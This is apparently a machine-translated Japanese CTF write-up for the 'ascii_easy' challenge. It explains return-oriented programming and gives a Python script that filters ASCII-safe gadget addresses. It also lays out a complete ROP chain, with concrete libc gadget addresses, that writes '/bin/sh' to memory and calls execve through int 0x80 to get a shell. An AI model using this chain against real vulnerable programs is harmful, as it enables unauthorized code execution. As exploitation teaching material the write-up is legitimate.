次に、ROPチェーンを組み立てる必要があります。これを行うには、ROPガジェットツールを使用します。

ROPgadget --binary libc-2.15.so > gadgets.txt

gadgets.txtファイルには、可能なすべてのROPチェーンがあります（最初の例10を以下に示します）。



問題は、アスキー文字のみで構成されるものを選択する必要があることです。これを行うには、これらのアドレスのみを残す単純なフィルターを作成します。その各バイトは0x20から0x7fまでの間隔に属します。

def addr_check(addr):
	ret = True
	for i in range(0,8,2):
		if int(addr[i:i+2], 16) not in range(0x20, 0x80):
			ret = False
	return ret

f = open('gadgets.txt', 'rt')
old_gadgets = f.read().split('\n')[2:-3]
f.close()

new_gadgets = ""
base_addr = 0x5555e000

for gadget in old_gadgets:
	addr = base_addr + int(gadget.split(' : ')[0], 16)
	if addr_check(hex(addr)[2:]):
		new_gadgets += (hex(addr) + ' :' + ":".join(gadget.split(':')[1:]) + '\n')

f = open('new_gadgets.txt', 'wt')
f.write(new_gadgets)
f.close()

Ropガジェット


多くの人が、リターン指向のプログラミングについて詳細を尋ねました。では、イラストを使って例を挙げましょう。バッファオーバーフローの脆弱性と実行不可能なスタックがあるとします。

ROPガジェットは、return returnステートメントで終了する一連の命令です。原則として、ガジェットは関数の末尾から選択します。例として、いくつかの関数を取ります。それらのそれぞれで、ROPガジェット（赤で強調表示）を選択します。







したがって、いくつかのROPチェーンがあります。

0x000ed7cb: mov eax, edx; pop ebx; pop esi; ret
0x000ed7cd: pop ebx; pop esi; ret
0x000ed7ce: pop esi; ret
0x00033837: pop ebx; ret
0x0010ec1f: add esp, 0x2c; ret

これがどんな種類の獣なのか、ROPチェーンを見てみましょう。バッファがオーバーフローした場合、リターンアドレスを書き換えることができます。現時点では、ターゲット関数でret命令を実行する必要があると仮定します。つまり、有効なアドレスがスタックの一番上にあるとします。

たとえば、次のコードを実行するとします。

add esp, 0x2c
add esp, 0x2c
add esp, 0x2c
mov eax, edx 
pop ebx
pop esi
ret

有効な返信先住所を次の住所に書き換える必要があります。

0x0010ec1f
0x0010ec1f
0x0010ec1f
0x000ed7cb

これが機能する理由を理解するために、下の画像を見てみましょう。



したがって、有効なアドレスに戻る代わりに、ROPチェーンの最初のアドレスに移動します。最初のコマンドを実行した後、ret命令はプログラムをスタック上の次のアドレス、つまり2番目のコマンドに移動します。2番目のコマンドもretで終了します。これは、スタックにアドレスが示されている次のコマンドに移動します。このようにして、以前にコンパイルしたコードの実行を実現します。

ascii_easyのROPチェーニング


まず、バッファをオーバーフローさせるために必要なバイト数を調べます。プログラムをgdbで実行し、その行を入力に渡します。



そして、プログラムはアドレス「bbbb」にクラッシュします。これは、パディングが32文字であることを意味します。

ROPを使用する最も便利な方法は、execve関数を使用することです。便利なのは、レジスタを介してパラメータを渡すことです。この関数をlibcライブラリで見つけましょう。これは、GDBを使用して行うことができます。



しかし、メモリ内のライブラリロードアドレスを関数アドレスに追加すると、ASCII条件を満たさないことがわかります。



しかし、関数を呼び出す別のオプションがあります。これはシステムコールを介して行われます。 Linuxでは、各システムコールに独自の番号があります。この番号はEAXレジスタ内にある必要があり、その後にint 0x80割り込み呼び出しが続きます。完全なsiscallテーブルはここで見ることができます。



したがって、execve関数の数値は11です。つまり、値0xbはEAXレジスターにある必要があります。パラメータはEBXレジスタを介して転送されます-パラメータ行の先頭のアドレス、ECX-パラメータ行へのポインタのアドレス、およびEDX-引数環境変数へのポインタのアドレス。



文字列 '/ bin / sh'を関数に渡す必要があります。これを行うには、記録できる場所に書き込み、文字列のアドレスをパラメーターとして渡す必要があります。行は4文字を保存する必要があります。「/ bin」および「// sh」。レジスタはそれぞれ4バイトを送信するため。このため、私は次のガジェットを見つけました：

0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret
0x55687b3c : mov dword ptr [edx], edi ; pop esi ; pop edi ; ret

このガジェット：

  1. スタックから文字列を書き込むためのアドレスを取得し、それをedxレジスターに入れると、eaxがリセットされます。
  2. スタックから値を取得し、それをediに配置します。
  3. ediからedxのアドレスに値をコピーします（目的のアドレスに行を書き込みます）。
  4. スタックからさらに2つの値を取得します。

したがって、その操作のために、次の値を転送する必要があります。

0x555f3555 				;   
memory_addr				;     (edx)
4__			; 4    (edi)
0x55687b3c 				;   
4__			;    (esi)
4__			;    (edi)

次に、同じガジェットを実行して、行の2番目の部分をコピーできます。ライブラリは読み取り、書き込み、および実行のためにアクセス可能なメモリ領域にロードされるため、書き込み用のアドレスを見つけることは難しくありません。



ASCII条件を満たすアドレスはすべてそこに取り込むことができます。私はアドレス0x55562023を取った。

次に、行をnull文字で終了する必要があります。このタスクでは、次のガジェットチェーンを使用します。

0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret
0x5560645c : mov dword ptr [edx], eax ; ret

このガジェット：

  1. スタックからnullエントリのアドレスを取得し、それをedxレジスタに置きます。
  2. スタックから値を取得します。
  3. ゼロ化されたeaxからedxのアドレスに値をコピーします。

したがって、その操作のために、次の値を転送する必要があります。

0x555f3555 				;   
memory_addr+8			;    0 -   (edx)
4__			;    edi
0x5560645c 				;

したがって、文字列をメモリにコピーしました。次に、値を転送するためにレジスタに入力する必要があります。execveで呼び出された「/ bin / sh」プログラムには独自の引数と環境変数がないため、ヌルポインターをそれらに渡します。ebxでは行にアドレスを書き込み、eaxでは11-execveシスコールの番号を書き込みます。このため、私は次のガジェットを見つけました：

0x555f3555 : pop edx ; xor eax, eax ; pop edi ; ret
0x556d2a51 : pop ecx ; add al, 0xa ; ret
0x5557734e : pop ebx ; ret
0x556c6864 : inc eax ; ret

このガジェット：

  1. スタックの値をedxに入れ、eaxをリセットします。
  2. 値をスタックからediに移動します。
  3. 値をスタックからecxに移動し、ゼロのeax 10に追加します。
  4. スタックからebxに値を移動します。
  5. eaxを10から11に増やします。

したがって、その操作のために、次の値を転送する必要があります。

0x555f3555				;   
memory_addr+8			;  null (edx)
4__			;    edi
0x556d2a51				;   
memory_addr+8			;  null (ecx)
0x5557734e				;   
memory_addr				;  -(ebx)
0x556c6864				;

そして、例外を除いて、ROPチェーンを終了します。

0x55667176 : inc esi ; int 0x80
